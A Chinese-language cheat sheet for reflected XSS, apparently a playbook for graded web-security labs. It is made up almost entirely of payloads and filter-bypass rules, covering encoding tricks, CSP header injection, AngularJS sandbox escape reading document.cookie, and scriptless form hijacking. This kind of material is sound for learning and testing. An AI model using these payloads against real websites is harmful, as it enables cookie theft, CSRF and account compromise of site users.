# Reflection XSS 测试与绕过

## 1. 确认回显上下文与可利用点
- 提交 `"><h1>x</h1>` 判断能否闭合标签；提交 `"><img src=x>` 判断是否过滤尖括号/引号。
- 记录每个回显位置：文本节点、属性值（单/双/无引号）、href/URL、JS 变量、Angular 表达式、Cookie、CSP/响应头。
- 同一请求中可能多个参数或多个位置回显；选择最易触发的上下文，不要只盯第一个点。
- 同一值同时进入 value 和 href 时，分别判断两个位置的过滤差异；不要在一个位置失败后仍沿用同一思路。

## 2. 属性值注入与触发选择
- 双引号属性：`"><img src=x onerror=alert(1)>` 或 `" autofocus onfocus=alert(1) x="`。
- 单引号属性：`'><img src=x onerror=alert(1)>`。
- 无引号属性：`x onmouseover=alert(1)`。
- 自动触发优先：onerror/onload/onscroll；onmouseover/onfocus 需要交互，判分环境可能不触发。但 autofocus+onfocus 可使输入自动聚焦触发。
- 当标签为 `<input type=hidden>` 且无法注入新标签（`< >` 被删除）：不要用 `type=image` + `onerror`，input 上通常不自动触发；改为修改原 input 属性：`" type="text" autofocus onfocus=alert(1) x="`。
- 若 `< >` 保留，优先注入新标签 `<svg/onload=alert(1)>`，而不是依赖 input 事件。

## 3. href/URL 上下文
- 信号：反射进 `<a href>` 或 URL 类属性；只过滤 `script`/`on`，无合法 URL 校验。决策：直接构造 `javascript:` 伪协议，对 `script` 使用 HTML 实体编码：`java&#115;cript:alert(1)`。不要在该上下文内使用事件属性（`onclick`/`onmouseover`），href 不会触发事件。
- 信号：服务端要求 URL 必须包含 `http://`，否则整段替换；同时仍过滤 `script`/`on`。决策：使用伪协议并在尾端用 `//http://` 注释掉校验字符串：`java&#115;cript:top['pr'+'ompt'](1)//http://`。不要先放 `http://`，也不要把事件属性塞进 href。
- 若需 URL 编码传输，将 `&` 写成 `%26`，`#` 写成 `%23`。

## 4. 关键字过滤绕过
### 4.1 大小写混合
- 服务端字符串替换大小写敏感时，HTML 解析不区分大小写：`OnErRoR`、`hRef`、`sCrIpT`。最小示例：`"><img src=x OnErRoR=top['al'+'ert'](1)>`。

### 4.2 HTML 实体编码拆分关键字
- 将敏感字拆成数字字符引用：`java&#115;cript:alert(1)`。若需 URL 编码传输，将 `&` 写成 `%26`，`#` 写成 `%23`。

### 4.3 JS 内部字符串拆分
- 在事件处理器或 Angular 表达式内用拼接绕过 `alert` 等字面量：`top['al'+'ert'](1)`。

### 4.4 URL 编码/双重编码
- 若过滤发生在 URL 解码后，用 `%2573` 等双重编码。传输 HTML 实体时用 `%26%23115%3B`。

### 4.5 双重过滤（替换后删除占位符）
- 信号：输出中出现 `o_n`、`scr_ipt` 或 `_` 被删除的痕迹；`< > "` 保留。决策：先判断 `_` 是否最终删除。若删除，直接使用 `onclick`/`script` 即可恢复；若保留或替换递归，使用双写关键字使替换后拼接出有效关键字。属性上下文最小示例：`" oonnclick="alert(1)`。不要在此场景继续用 HTML 实体/大小写绕过，优先利用过滤的还原行为。
- 当同一值同时进入 value 和 href，且 on/script 被这种双重过滤影响时：优先在 value 属性内恢复事件属性，不要试图在 href 中构造实体伪协议。

## 5. CSP 与响应头注入
- 信号：script 注入存在但被 CSP 拦截（script-src 无 unsafe-inline），且某请求参数值进入 CSP 头（如 report-uri `/csp-report?token=<token>`）未过滤分号。
- 决策：通过该参数追加 CSP 策略，允许内联脚本：`token=;script-src-elem 'unsafe-inline'`。保留原内联 payload，如 `/?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'`。
- 若参数值有 URL 编码，分号可能需要解码；若只反射到响应头且未过滤分隔符，优先尝试 script-src-elem（现代浏览器）或 script-src。
- 不要只尝试 meta refresh 绕过；有头注入点时先改 CSP。

## 6. Cookie 注入
- 插入点来自 Cookie 值时，直接修改请求 Cookie 头，避免多步 Set-Cookie 覆盖。
- Cookie 值不允许 `;`、空格、换行；需 URL 编码 `"` 等特殊字符。
- 在 Cookie 中属性注入：`" type="image" src="x" onerror="alert(1)`；若 `< >` 被删除且是 hidden input，改为 `" type="text" autofocus onfocus=alert(1) x="`。

## 7. AngularJS / ng-include
- 信号：输入位于 `ng-include:{{src}}` 的表达式内，值被当作 URL 加载并编译。
- 决策：闭合 Angular 字符串，使表达式求值为同源 URL，并在该 URL 参数中携带可执行 HTML。最小示例：`'level1.php?name=<img src=x onerror=top["pr"+"ompt"](1)>'`。
- 不要优先使用 `constructor.constructor` 沙箱；ng-include 场景下沙箱通常不是最优。
- 若输入只是普通 Angular 表达式且无法加载 URL，再尝试 window 引用和字符串拆分。

## 8. AngularJS 沙箱逃逸 + CSP + 长度限制
- 信号：反射值被 AngularJS(ng-app) 编译求值；页面 CSP 严格（禁内联脚本/事件处理器，禁 unsafe-eval），常规 HTML/JS 注入均不执行；search 长度有上限。
- 决策：执行路径只能走 Angular 指令/表达式。优先使用 `ng-focus` 或 `ng-click` 等指令属性 + 过滤器链，不要用内联事件处理器。表达式内执行全局函数时先赋值给局部变量再调用：`(y=alert)(document.cookie)`，不要直接 `alert(...)`。
- 自动触发：给注入元素设置 `id=x` 并使用 URL 片段 `#x` 自动聚焦，无需用户交互；不要在长度受限时尝试完整跳转脚本写在参数内。
- 若长度不够，将跳转脚本放到 exploit server body，由 victim 访问后跳转到完整 payload URL；注入 payload 本身仍放在目标参数中。
- 最小示例：注入 payload：`<input id=x ng-focus=$event.composedPath()|orderBy:'(y=alert)(document.cookie)'>#x`。不要使用 `constructor.constructor` 长链，优先短过滤器链。

## 9. 无脚本 / 严格 CSP 下的表单劫持
- 信号：反射点在表单内（如 `<input type="email" name="email" value="...">`），CSP 极严格（default-src 'self'，禁内联脚本/外部子资源），无法执行 JS，但可注入 HTML/属性；反射点后紧跟 hidden csrf。
- 决策：放弃 JS 执行，利用原生表单提交完成 CSRF 或数据篡改；不要使用 `onclick/onfocus/fetch` 等需要脚本的 payload。
- 闭合 value 后注入 `button type="submit"`，把攻击者控制的值保留在原表单字段内，诱使/自动触发提交；若需要自动提交，尝试修改 `action`，但 CSP 禁脚本时不能自动提交，保留按钮即可。最小示例：`hacker@evil-user.net"><button type="submit">Click</button>`。

## 10. 判分失败排查
- CSP 拦截内联：检查参数能否影响 CSP 头，注入 `;script-src-elem 'unsafe-inline'`。
- hidden input 事件不触发：若 `< >` 被删，用 `type=text autofocus onfocus`；不要继续用 type=image + onerror。
- 关键字 on 被简单替换为其他词且未恢复：不要用 onclick，改用 hRef 或大小写/实体编码。若 on 被替换为 `o_n` 且 `_` 后续删除：直接使用 `onclick` 或双写恢复，不要用 hRef。
- 多反射点：分别测试两个位置的过滤；若 on 被替换后删除，优先在 value 属性恢复 `onclick`；若 href 有合法校验，走伪协议+注释。
- href 必须包含 `http://`：使用 `javascript:` 伪协议并在尾部 `//http://` 注释，不要在 href 内放事件属性。
- Angular ng-include：避免沙箱，构造同源 URL 返回 HTML。
- Angular + CSP + 长度限制：使用 `ng-focus` + `orderBy` 过滤器链，`#id` 自动聚焦，表达式内先赋值再调用。
- CSP 禁脚本且反射点在表单内：改注入 submit 按钮，不要用内联 JS。
- Cookie payload 未触发：确认没有分号、空格，检查 URL 解码是否影响分句。